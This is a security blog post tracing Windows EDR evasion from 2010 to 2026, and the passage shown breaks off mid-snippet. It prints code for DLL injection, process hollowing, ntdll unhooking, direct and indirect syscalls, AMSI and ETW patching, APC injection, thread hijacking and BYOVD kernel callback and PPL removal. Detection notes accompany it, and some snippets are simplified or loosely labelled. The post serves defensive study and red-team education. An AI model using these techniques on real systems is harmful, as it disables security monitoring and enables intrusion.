# https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/

# The EDR Bypass Roadmap: Technical Evolution and API Subversion

![](https://benjitrapp.github.io/images/edr-bypass-timeline.png) The battle for the endpoint is won or lost in telemetry. This has been increasingly recognized by the security community, with projects such as [EDR Telemetry](https://www.edr-telemetry.com/) aiming to systematically compare and improve EDR visibility.

This timeline breaks down the evolution of evasion—from early Windows API abuse to modern hardware- and behavior-level subversion—mapped against the **MITRE ATT&CK®** framework and aligned with my research into [**Windows APIs**](https://benjitrapp.github.io/attacks/2024-06-07-red-windows-api/) and [**ETW (Event Tracing for Windows)**](https://benjitrapp.github.io/defenses/2024-02-11-etw/).

|     |     |     |     |     |     |     |
| --- | --- | --- | --- | --- | --- | --- |
| **Related posts in this blog:** [Understanding and Attacking EDRs](https://benjitrapp.github.io/attacks/2024-08-21-edr-and-malware/) | [Detecting EDR Hooks](https://benjitrapp.github.io/attacks/2026-06-19-edr-hook-detection/) | [Hell’s Gate, Heaven’s Gate & Tartarus Gate](https://benjitrapp.github.io/attacks/2026-01-19-hells-heaven-tartarus-gate/) | [Early Bird & Early Cascade Injection](https://benjitrapp.github.io/attacks/2026-01-19-early-bird-cascade/) | [Threadless Injection & Process Ghosting](https://benjitrapp.github.io/attacks/2026-05-17-threadless-injection-process-ghosting/) | [ETW-TI Deep Dive](https://benjitrapp.github.io/defenses/2026-06-19-etw-ti/) | [Breaking ETW and EDR](https://benjitrapp.github.io/attacks/2024-02-11-offensive-etw/) |

- [Phase 1: The Foundation (2010–2015)](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#phase-1-the-foundation-20102015)
  - [2012–2013: Injection Primitives \\& API Abuse](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#20122013-injection-primitives--api-abuse)
  - [2014: Reflective \\& Manual Loading](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#2014-reflective--manual-loading)
- [Phase 2: The Hooking Crusade (2015–2017)](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#phase-2-the-hooking-crusade-20152017)
  - [2015–2016: Understanding API Hooking](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#20152016-understanding-api-hooking)
  - [2016: Manual Unhooking Emerges](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#2016-manual-unhooking-emerges)
- [Phase 3: The Syscall Revolution (2017–2019)](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#phase-3-the-syscall-revolution-20172019)
  - [2017: Direct Syscalls](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#2017-direct-syscalls)
  - [2018–2019: Syscall Evolution](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#20182019-syscall-evolution)
- [Phase 4: The age of Deception - Syscalls \\& Stack Integrity (2019–2021)](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#phase-4-the-age-of-deception---syscalls--stack-integrity-20192021)
- [Phase 5: The ETW \\& Memory Evasion Era (2020–2022)](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#phase-5-the-etw--memory-evasion-era-20202022)
- [Phase 6: Advanced Injection \\& Modern Era (2022–Present / Time of Writing: 2026)](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#phase-6-advanced-injection--modern-era-2022present--time-of-writing-2026)
- [Phase 7: Kernel-Level \\& Hardware-Assisted Evasion (2023–2026)](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#phase-7-kernel-level--hardware-assisted-evasion-20232026)
  - [BYOVD — Bring Your Own Vulnerable Driver](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#byovd--bring-your-own-vulnerable-driver)
  - [Kernel Callback Table Manipulation](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#kernel-callback-table-manipulation)
  - [PPL Bypass \\& Protected Process Subversion](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#ppl-bypass--protected-process-subversion)
  - [Advanced Sleep Obfuscation](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#advanced-sleep-obfuscation)
  - [Hardware Breakpoint Syscalls](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#hardware-breakpoint-syscalls)
  - [Module Stomping \\& Phantom DLL Hollowing](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#module-stomping--phantom-dll-hollowing)
- [Technical Summary \\& API Matrix](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#technical-summary--api-matrix)
- [Conclusion](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/#conclusion)

Overview about the timeline, its phases and related techniques that will be discussed below:

![](https://benjitrapp.github.io/images/edr_bypass_timeline_chart.png)

2010 – 2015

🔧

**Phase 1: The Foundation** — Classic DLL Injection, Process Hollowing, Manual Mapping, Reflective DLL Loading. EDRs lacked memory-write ↔ thread-creation correlation.


2015 – 2017

🪝

**Phase 2: The Hooking Crusade** — EDRs deploy inline hooks & IAT patches on `Nt*` APIs. Attackers respond with IAT hook detection and manual ntdll unhooking.


2017 – 2019

⚙️

**Phase 3: The Syscall Revolution** — Direct syscalls bypass ntdll entirely. Hell's Gate / Halos Gate / Tartarus' Gate enable dynamic SSN resolution. SysWhispers industrializes the technique.


2019 – 2021

🎭

**Phase 4: The Age of Deception** — EDRs add call-stack analysis. Indirect syscalls via ROP gadgets, return-address spoofing, and stack pivoting restore a legitimate execution context.


2020 – 2022

👁️

**Phase 5: ETW & Memory Evasion Era** — Defenders shift to ETW telemetry. Attackers blind it via `EtwEventWrite` patching, AMSI bypass, and session hijacking. ETW-TI (kernel-mode) proves immune.


2022 – 2024

🚀

**Phase 6: Advanced Injection & Modern Era** — Early Bird & Early Cascade APC injection exploit the pre-hook initialization window. Threadless Injection and Process Ghosting eliminate thread-creation telemetry entirely. Sleep obfuscation (Ekko/Foliage) encrypts beacons at rest.


2023 – 2026

⚡

**Phase 7: Kernel-Level & Hardware-Assisted Evasion** — BYOVD (Bring Your Own Vulnerable Driver) removes kernel callbacks and strips PPL. Hardware breakpoints (`DR0`–`DR3`) dispatch syscalls without touching code bytes. Module Stomping and Phantom DLL Hollowing hide shellcode from VAD scanners. HVCI and the Vulnerable Driver Blocklist are the final defensive frontier.


## Phase 1: The Foundation (2010–2015)

**Strategy:** Exploiting trust by utilizing legitimate Windows mechanisms for code placement.

### 2012–2013: Injection Primitives & API Abuse

Early EDR solutions primarily monitored **high-level Windows APIs** with limited context or correlation. This made classic injection primitives highly effective, particularly when combined with trusted parent processes.

Common techniques included:

- **Classic DLL Injection ( [T1055.001](https://attack.mitre.org/techniques/T1055/001/))**
  - `OpenProcess`
  - `VirtualAllocEx`
  - `WriteProcessMemory`
  - `CreateRemoteThread`

```
// Example: Classic DLL Injection
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTargetPID);
LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwSize,
                                    MEM_COMMIT, PAGE_READWRITE);

WriteProcessMemory(hProcess, pRemoteBuf,
                   "C:\\payload.dll", dwSize, NULL);

HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
    (LPTHREAD_START_ROUTINE)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA"),
    pRemoteBuf, 0, NULL);
```

Copy


These APIs are discussed in detail in my [Windows API offensive overview](https://benjitrapp.github.io/attacks/2024-06-07-red-windows-api/), where their abuse patterns and detection blind spots are broken down.

- **Process Hollowing (RunPE)**
- **Manual DLL Mapping ( [T1055.001](https://attack.mitre.org/techniques/T1055/001/))**
  - Avoiding Import Address Table (IAT) hooks
  - Bypassing loader-based telemetry

```
// Example: Manual Mapping - Resolving Imports
void ResolveImports(PBYTE pBase, PIMAGE_IMPORT_DESCRIPTOR pIID) {
    while (pIID->Name) {
        PIMAGE_THUNK_DATA pThunk =
            (PIMAGE_THUNK_DATA)(pBase + pIID->FirstThunk);

        while (pThunk->u1.AddressOfData) {
            PIMAGE_IMPORT_BY_NAME pIBN =
                (PIMAGE_IMPORT_BY_NAME)(pBase + pThunk->u1.AddressOfData);

            HMODULE hMod = LoadLibraryA((LPCSTR)(pBase + pIID->Name));
            FARPROC pFunc = GetProcAddress(hMod, pIBN->Name);

            pThunk->u1.Function = (ULONGLONG)pFunc;
            pThunk++;
        }
        pIID++;
    }
}
```

Copy


These techniques worked because EDRs lacked:

- Memory-write ↔ thread-creation correlation
- Call stack awareness
- Kernel-level process visibility

- **Process Hollowing ( [T1055.012](https://attack.mitre.org/techniques/T1055/012/))**


Hijacking a legitimate process by unmapping its code and replacing it with a malicious payload.

```
// Example: Creating a suspended process for hollowing
STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi;

CreateProcessA(
    "C:\\Windows\\System32\\svchost.exe",
    NULL, NULL, NULL, FALSE,
    CREATE_SUSPENDED,
    NULL, NULL,
    &si, &pi
);

// Unmapping the original image (Native API)
typedef NTSTATUS (NTAPI* _NtUnmapViewOfSection)(HANDLE, PVOID);

_NtUnmapViewOfSection NtUnmapViewOfSection =
    (_NtUnmapViewOfSection)GetProcAddress(
        GetModuleHandleA("ntdll.dll"),
        "NtUnmapViewOfSection"
    );

NtUnmapViewOfSection(pi.hProcess, pBaseAddress);
```

Copy


### 2014: Reflective & Manual Loading

Stephen Fewer’s **Reflective DLL Loading ( [T1055.001](https://attack.mitre.org/techniques/T1055/001/))** introduced a new paradigm: executing DLLs without invoking the Windows loader. By avoiding `LoadLibrary`, attackers could bypass many API hooks and loader callbacks.

```
// Example: Reflective DLL Loader stub
HMODULE WINAPI ReflectiveLoader(VOID) {
    ULONG_PTR uiLibraryAddress;
    USHORT usCounter;

    // Get own image base (uses compiler intrinsic _ReturnAddress() in practice)
    uiLibraryAddress = caller();  // simplified - Fewer's original uses _ReturnAddress()
    uiLibraryAddress = (ULONG_PTR)((UINT_PTR)uiLibraryAddress & 0xFFFFFFFFFFFF0000);

    while (TRUE) {
        if (((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE) {
            break;
        }
        uiLibraryAddress -= 0x10000;
    }

    // Parse PE headers and perform manual loading
    // ... (relocations, imports, TLS, etc.)

    return (HMODULE)uiLibraryAddress;
}
```

Copy


While still heavily used in modern C2 frameworks, reflective loading has increasingly shifted toward:

- Position Independent Code (PIC)
- Shellcode-only loaders

This evolution mirrors the detection trends discussed in the Windows API series above.

## Phase 2: The Hooking Crusade (2015–2017)

**Strategy:** Detecting and removing userland sensors.

### 2015–2016: Understanding API Hooking

As EDR products matured, they aggressively adopted **userland API hooking** for visibility into attacker tradecraft:

- Inline hooks (prologue patching)
- IAT hooking
- Trampoline-based redirection

Targeted APIs included:

- `NtCreateProcess`
- `NtAllocateVirtualMemory`
- `NtWriteVirtualMemory`
- `NtCreateFile`

These APIs and their monitoring implications are covered in depth in the [Windows API attack surface analysis](https://benjitrapp.github.io/attacks/2024-06-07-red-windows-api/).

### 2016: Manual Unhooking Emerges

Attackers responded by restoring trust boundaries inside userland:

- **Detecting hooks ( [T1562.001](https://attack.mitre.org/techniques/T1562/001/))** by comparing in-memory vs. on-disk bytes (for a comprehensive scanner that automates this, see [Detecting and Enumerating EDR Hooks](https://benjitrapp.github.io/attacks/2026-06-19-edr-hook-detection/))
- Loading clean DLL copies
- Restoring original syscall stubs

```
// Example: Detecting IAT hooks
BOOL DetectIATHook(HMODULE hModule, LPCSTR szFunc) {
    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)(
        (BYTE*)hModule + pDosHdr->e_lfanew);

    PIMAGE_IMPORT_DESCRIPTOR pImpDesc = (PIMAGE_IMPORT_DESCRIPTOR)(
        (BYTE*)hModule +
        pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    // Compare IAT entries with expected addresses
    FARPROC pExpected = GetProcAddress(hModule, szFunc);
    FARPROC pActual = *(FARPROC*)((BYTE*)hModule + pImpDesc->FirstThunk);

    return (pExpected != pActual);
}
```

Copy


- **Manual Unhooking ( [T1562.001](https://attack.mitre.org/techniques/T1562/001/))**


Overwriting hooked `.text` sections with clean bytes.

```
// Example: Overwriting ntdll hooks with a clean buffer
DWORD oldProtect;

VirtualProtect(pNtOpenProcess, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy(pNtOpenProcess, "\x4c\x8b\xd1\xb8\x26", 5); // Original bytes
VirtualProtect(pNtOpenProcess, 5, oldProtect, &oldProtect);
```

Copy


## Phase 3: The Syscall Revolution (2017–2019)

**Strategy:** Bypassing the hooked middleman (`ntdll.dll`) entirely.

### 2017: Direct Syscalls

Direct syscalls removed EDR visibility by transitioning directly to kernel mode, bypassing all userland hooks.

- **Direct Syscalls ( [T1106](https://attack.mitre.org/techniques/T1106/))**

```
; Example: Syscall stub for NtAllocateVirtualMemory (x64)
public NtAllocateVirtualMemory

NtAllocateVirtualMemory proc
    mov r10, rcx
    mov eax, 18h    ; Syscall number for Win10 (example)
    syscall
    ret
NtAllocateVirtualMemory endp
```

Copy


### 2018–2019: Syscall Evolution

Research such as **Hell’s Gate**, **Halos Gate**, and **Tartarus’ Gate** addressed syscall volatility and hooked exports, culminating in tools like **SysWhispers**.

```
// Example: Hell's Gate - Dynamically resolve syscall numbers
DWORD GetSSN(LPCSTR functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pFunc = GetProcAddress(hNtdll, functionName);

    // Check if function is hooked
    if (*(BYTE*)pFunc == 0xE9) { // JMP instruction
        // Use Halos Gate technique - search nearby functions
        for (int i = 1; i <= 32; i++) {
            BYTE* pNeighbor = (BYTE*)pFunc + (i * 0x20);
            if (*(DWORD*)pNeighbor == 0xB8D18B4C) { // mov r10, rcx; mov eax
                return *(DWORD*)(pNeighbor + 4) + i;
            }
        }
    }

    // Extract SSN from function prologue
    if (*(DWORD*)pFunc == 0xB8D18B4C) { // mov r10, rcx; mov eax, SSN
        return *(DWORD*)((BYTE*)pFunc + 4);
    }

    return 0;
}
```

Copy


## Phase 4: The age of Deception - Syscalls & Stack Integrity (2019–2021)

**Strategy:** Preserving legitimate execution context.

As EDRs began analyzing call stacks, indirect syscalls ensured execution appeared to originate from trusted modules.

- **ROP/JOP syscall gadgets ( [T1055](https://attack.mitre.org/techniques/T1055/))**
- **Stack pivoting ( [T1055.011](https://attack.mitre.org/techniques/T1055/011/))**
- **Return address spoofing ( [T1562.001](https://attack.mitre.org/techniques/T1562/001/))**

```
// Example: Indirect Syscall using ROP gadget
void IndirectSyscall() {
    // Find 'syscall; ret' gadget in ntdll.dll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PBYTE pBase = (PBYTE)hNtdll;
    PBYTE pSyscallGadget = NULL;

    // Search for syscall instruction (0x0F 0x05)
    for (SIZE_T i = 0; i < 0x100000; i++) {
        if (pBase[i] == 0x0F && pBase[i+1] == 0x05) {
            pSyscallGadget = &pBase[i];
            break;
        }
    }

    // Call syscall through gadget (preserves legitimate call stack)
    typedef NTSTATUS(*SyscallFn)();
    SyscallFn syscall = (SyscallFn)pSyscallGadget;

    __asm {
        mov r10, rcx
        mov eax, SSN  // Syscall Service Number
        jmp pSyscallGadget  // Jump to syscall gadget in ntdll
    }
}
```

Copy


These techniques laid the groundwork for modern call stack spoofing and sleep obfuscation.

## Phase 5: The ETW & Memory Evasion Era (2020–2022)

**Strategy:** Blinding telemetry pipelines.

As defenders shifted toward [**ETW**](https://benjitrapp.github.io/defenses/2024-02-11-etw/), attackers responded with:

- **Provider patching ( [T1562.006](https://attack.mitre.org/techniques/T1562/006/))**
- **Session hijacking ( [T1562.006](https://attack.mitre.org/techniques/T1562/006/))**
- **Trace tampering ( [T1562.006](https://attack.mitre.org/techniques/T1562/006/))**

```
// Example: ETW Provider Removal
void DisableAMSIETW() {
    // Disable AMSI ETW Provider
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");

    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, 32, PAGE_EXECUTE_READWRITE, &oldProtect);

    // Patch to always return AMSI_RESULT_CLEAN
    memset(pAmsiScanBuffer, 0x90, 6);  // NOP sled
    *(BYTE*)pAmsiScanBuffer = 0xB8;      // mov eax,
    *(DWORD*)((BYTE*)pAmsiScanBuffer + 1) = 0; // AMSI_RESULT_CLEAN
    *(BYTE*)((BYTE*)pAmsiScanBuffer + 5) = 0xC3; // ret

    VirtualProtect(pAmsiScanBuffer, 32, oldProtect, &oldProtect);
}
```

Copy


- **ETW Patching ( [T1562.006](https://attack.mitre.org/techniques/T1562/006/))**

```
// Example: Silencing ETW telemetry
void PatchETW() {
    void* pEventWrite =
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");

    DWORD old;
    VirtualProtect(pEventWrite, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE*)pEventWrite = 0xC3; // RET
    VirtualProtect(pEventWrite, 1, old, &old);
}
```

Copy


> **Important caveat:** These user-mode ETW patches only affect standard ETW providers. Microsoft’s kernel-mode [ETW Threat Intelligence (ETW-TI)](https://benjitrapp.github.io/defenses/2026-06-19-etw-ti/) provider fires events directly from `ntoskrnl.exe` kernel callbacks and is immune to `EtwEventWrite` patching. For a comprehensive view of offensive ETW techniques and their limitations, see [Breaking ETW and EDR](https://benjitrapp.github.io/attacks/2024-02-11-offensive-etw/).

* * *

## Phase 6: Advanced Injection & Modern Era (2022–Present / Time of Writing: 2026)

**Strategy:** Subverting execution and detection logic.

- **Early Bird Injection ( [T1055](https://attack.mitre.org/techniques/T1055/))**


Leveraging APC (Asynchronous Procedure Call) queues to inject code before the main thread executes, exploiting the process initialization window.

```
// Example: Early Bird APC Injection
void EarlyBirdInjection(LPCSTR szTargetPath, PVOID pShellcode, SIZE_T shellcodeSize) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Create target process in suspended state
    CreateProcessA(szTargetPath, NULL, NULL, NULL, FALSE,
                   CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // Allocate memory in target process
    LPVOID pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Write shellcode to allocated memory
    WriteProcessMemory(pi.hProcess, pRemoteCode, pShellcode, shellcodeSize, NULL);

    // Queue APC to main thread (executes before thread starts)
    QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);

    // Resume thread - APC executes before EntryPoint
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
```

Copy


This technique is particularly effective because:

- APC execution occurs before EDR hooks are fully initialized
- The process is legitimate at creation time
- No remote thread creation is required

For a detailed analysis of both techniques, including Early Cascade’s exploitation of `LdrInitializeThunk` and the DLL loading cascade, see [Early Bird & Early Cascade Injection](https://benjitrapp.github.io/attacks/2026-01-19-early-bird-cascade/). For even more advanced approaches that avoid thread creation entirely, see [Threadless Injection & Process Ghosting](https://benjitrapp.github.io/attacks/2026-05-17-threadless-injection-process-ghosting/).

- **Early Cascade Injection ( [T1055](https://attack.mitre.org/techniques/T1055/))**


An evolution of Early Bird that targets the `LdrInitializeThunk` function during process initialization, injecting code as part of the natural DLL loading flow before EDR hooks are installed.

```
// Example: Early Cascade - Chained APC Injection
void EarlyCascadeInjection(LPCSTR szTargetPath, PVOID pStage1, PVOID pStage2) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    CreateProcessA(szTargetPath, NULL, NULL, NULL, FALSE,
                   CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // Stage 1: Unhook or disable EDR
    LPVOID pStage1Addr = VirtualAllocEx(pi.hProcess, NULL, 0x1000,
                                        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, pStage1Addr, pStage1, 0x1000, NULL);

    // Stage 2: Final payload
    LPVOID pStage2Addr = VirtualAllocEx(pi.hProcess, NULL, 0x2000,
                                        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, pStage2Addr, pStage2, 0x2000, NULL);

    // Queue cascaded APCs
    QueueUserAPC((PAPCFUNC)pStage1Addr, pi.hThread, (ULONG_PTR)pStage2Addr);
    QueueUserAPC((PAPCFUNC)pStage2Addr, pi.hThread, NULL);

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
```

Copy


- **Thread Execution Hijacking ( [T1055.003](https://attack.mitre.org/techniques/T1055/003/))**
Suspending threads and modifying their context to execute malicious code.

```
// Example: Thread Hijacking
void HijackThread(DWORD dwTargetPID) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(THREADENTRY32) };

    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == dwTargetPID) {
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                SuspendThread(hThread);

                CONTEXT ctx = { 0 };
                ctx.ContextFlags = CONTEXT_FULL;
                GetThreadContext(hThread, &ctx);

                // Redirect RIP to shellcode
                ctx.Rip = (DWORD64)pShellcode;
                SetThreadContext(hThread, &ctx);
                ResumeThread(hThread);
                break;
            }
        } while (Thread32Next(hSnapshot, &te));
    }
}
```

Copy


- **Vectored Exception Handling (VEH) ( [T1562.001](https://attack.mitre.org/techniques/T1562/001/))**


Leveraging exception-driven control flow to execute syscalls stealthily.

```
LONG WINAPI MyHandler(PEXCEPTION_POINTERS pExcpt) {
    if (pExcpt->ExceptionRecord->ExceptionCode == STATUS_BREAKPOINT) {
        pExcpt->ContextRecord->Rip++; // Skip breakpoint
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

AddVectoredExceptionHandler(1, MyHandler);
```

Copy


## Phase 7: Kernel-Level & Hardware-Assisted Evasion (2023–2026)

**Strategy:** Moving the battlefield from userland to the kernel and hardware layer, where most commercial EDRs have limited or no visibility.

The maturation of ETW-TI, kernel callbacks, and Credential Guard pushed offensive research below the user/kernel boundary. The result is a class of techniques that require a driver—either legitimately signed (BYOVD) or one you’ve placed yourself—or hardware features (`DR0`–`DR3`) that the OS exposes to unprivileged threads.

### BYOVD — Bring Your Own Vulnerable Driver

**BYOVD ( [T1068](https://attack.mitre.org/techniques/T1068/))** exploits a legitimately signed but vulnerable kernel driver to achieve ring-0 execution. The attacker loads the driver, weaponizes its IOCTL interface to execute an arbitrary kernel write or call, and then unloads it to reduce exposure. Notable examples include the exploitation of `gdrv.sys` (Gigabyte), `mhyprot2.sys` (MiHoYo), and `iqvw64e.sys` (Intel).

The primary payloads delivered through the kernel write primitive include:

- Removing EDR kernel callbacks registered via `PsSetCreateProcessNotifyRoutine`, `PsSetCreateThreadNotifyRoutine`, and `PsSetLoadImageNotifyRoutine`
- Zeroing the `ActiveProcessLinks` entry in `EPROCESS` to hide a process from the kernel’s process list
- Disabling Protected Process Light (PPL) on an EDR process by clearing the `Protection` field in `EPROCESS`

```
// Conceptual: Enumerate and unlink EDR callbacks via kernel write primitive
// (requires a BYOVD primitive that exposes arbitrary kernel read/write)

// 1. Locate PspCreateProcessNotifyRoutine array in ntoskrnl
ULONG_PTR pCallbackArray = FindKernelExport("PspCreateProcessNotifyRoutine");

// 2. Read each callback pointer
for (int i = 0; i < 64; i++) {
    ULONG_PTR cbEntry = KernelRead(pCallbackArray + i * sizeof(ULONG_PTR));
    if (!cbEntry) continue;

    // 3. Decode ExFastRef pointer (low 4 bits = ref count)
    ULONG_PTR pCallback = cbEntry & ~0xFULL;

    // 4. Identify EDR module by matching the callback's code to a known EDR driver
    // 5. Zero the entry to remove the callback
    KernelWrite(pCallbackArray + i * sizeof(ULONG_PTR), 0);
}
```

Copy


> **Detection:** Microsoft’s Vulnerable Driver Blocklist (enforced by HVCI/Memory Integrity) maintains a list of known-bad drivers. The [loldrivers.io](https://www.loldrivers.io/) project catalogs abused drivers and is a key reference for detection engineers building hash-based or signer-based blocklists.

### Kernel Callback Table Manipulation

Without a vulnerable driver, attackers with an existing kernel write primitive (e.g., from a CVE or BYOVD stage) can tamper with the Windows kernel’s notification routine arrays directly.

- **`PspCreateProcessNotifyRoutine`** — fired for every process creation; EDR uses this to inject its DLL
- **`PspCreateThreadNotifyRoutine`** — fired for every thread creation
- **`PspLoadImageNotifyRoutine`** — fired when a PE image is mapped into memory

```
// Conceptual: Removing a specific EDR callback from the notify routine array
// Each entry is an ExFastRef-encoded pointer to a EX_CALLBACK_ROUTINE_BLOCK

typedef struct _EX_CALLBACK_ROUTINE_BLOCK {
    EX_RUNDOWN_REF        RundownProtect;
    PEX_CALLBACK_FUNCTION Function;       // <-- the actual EDR callback
    PVOID                 Context;
} EX_CALLBACK_ROUTINE_BLOCK, *PEX_CALLBACK_ROUTINE_BLOCK;

// Decode and zero the callback for a targeted EDR driver
void RemoveCallback(ULONG_PTR* pArray, ULONG_PTR targetBase, ULONG_PTR targetEnd) {
    for (int i = 0; i < 64; i++) {
        ULONG_PTR encoded = pArray[i];
        if (!encoded) continue;
        ULONG_PTR block = encoded & ~0xFULL;
        ULONG_PTR fn = *(ULONG_PTR*)(block + offsetof(EX_CALLBACK_ROUTINE_BLOCK, Function));
        if (fn >= targetBase && fn < targetEnd)
            pArray[i] = 0; // unlinking the callback
    }
}
```

Copy


### PPL Bypass & Protected Process Subversion

**Protected Process Light (PPL)** prevents even high-privileged processes from opening EDR processes with `PROCESS_VM_READ`, `PROCESS_TERMINATE`, or similar rights. The protection level is encoded in the `EPROCESS.Protection` byte.

Without kernel access, PPL presents a hard wall. With it, removing PPL from a target process is a single-byte patch:

```
// Conceptual: PPL removal via kernel write primitive
// EPROCESS.Protection is a PS_PROTECTION structure at a known offset

typedef struct _PS_PROTECTION {
    UCHAR Type  : 3;   // PS_PROTECTED_TYPE
    UCHAR Audit : 1;
    UCHAR Signer: 4;   // PS_PROTECTED_SIGNER
} PS_PROTECTION;

// Offset varies by Windows build — must be resolved via PDB or pattern scan
ULONG_PTR pEPROCESS  = GetKernelEPROCESS(dwEdPID);
ULONG_PTR pProtection = pEPROCESS + PROTECTION_OFFSET;

// Zero the Protection field to strip PPL
KernelWrite8(pProtection, 0x00);

// Now OpenProcess with PROCESS_ALL_ACCESS succeeds against the former PPL process
```

Copy


Notable public implementations: `PPLKiller`, `PPLFault` (CVE-based, no driver required), and `NtFakeProtection` research.

### Advanced Sleep Obfuscation

**Sleep obfuscation** ( [T1055](https://attack.mitre.org/techniques/T1055/)) solves the problem of memory-scanning EDRs detecting shellcode beacons while they sleep. Instead of leaving the payload readable in `RWX` memory, the implant encrypts itself before sleeping and decrypts on wake.

**Ekko** (Cracked5pider, 2022) pioneered the technique using ROP chains + `CreateTimerQueueTimer` to defer execution of a decryption stub:

```
// Ekko-style sleep obfuscation - ROP chain via NtContinue
// Key insight: build a fake CONTEXT for each step, execute via NtContinue

void ObfuscatedSleep(DWORD dwMilliseconds, PVOID pPayload, SIZE_T payloadSize, BYTE* key) {
    // 1. Locate a RtlCaptureContext gadget and NtContinue in ntdll
    // 2. Build a chain of CONTEXT structures:
    //    ctx[0] -> VirtualProtect(payload, RW)
    //    ctx[1] -> SystemFunction032(payload, key)  // RC4 encrypt
    //    ctx[2] -> WaitForSingleObject(hTimer, timeout)
    //    ctx[3] -> SystemFunction032(payload, key)  // RC4 decrypt
    //    ctx[4] -> VirtualProtect(payload, RX)
    //    ctx[5] -> SetEvent / return

    // 3. Queue a kernel timer that fires NtContinue into ctx[0]
    //    The payload is encrypted (non-executable) during the entire sleep window
    CreateTimerQueueTimer(&hTimerObj, NULL,
        (WAITORTIMERCALLBACK)pNtContinue, &ctx[0],
        0, 0, WT_EXECUTEINTIMERTHREAD);

    WaitForSingleObject(hEvent, INFINITE);
}
```

Copy


**Foliage** and **Cronos** extended this concept with stack spoofing during sleep so the sleeping thread’s call stack shows only legitimate frames.

> **Detection:** EDRs counter sleep obfuscation with periodic memory scanning at fixed intervals, `MmSecureVirtualMemory` monitoring, and entropy analysis of `RX`→`RW`→`RX` permission transitions on the same region.

### Hardware Breakpoint Syscalls

**Hardware breakpoints** use the CPU’s debug registers (`DR0`–`DR3`) to set execution breakpoints without modifying any code bytes. Because the breakpoints live in CPU registers rather than memory, byte-comparison unhooking detection cannot see them.

The technique registers a **VEH handler** and arms a `DR` register on a target address (e.g., the syscall stub of `NtAllocateVirtualMemory`). When execution hits that address, the CPU fires `EXCEPTION_SINGLE_STEP`, the VEH handler intercepts it, redirects `RIP` to a clean syscall gadget, and sets the correct SSN—bypassing any inline hook the EDR placed on the stub.

```
// Hardware breakpoint syscall execution via DR0 + VEH
LONG NTAPI HwBpHandler(PEXCEPTION_POINTERS pExcpt) {
    if (pExcpt->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    PCONTEXT ctx = pExcpt->ContextRecord;

    // Check if we triggered on our patched address
    if (ctx->Dr6 & 0x1) {           // DR0 hit
        ctx->Rax = g_SSN;           // Inject the syscall service number
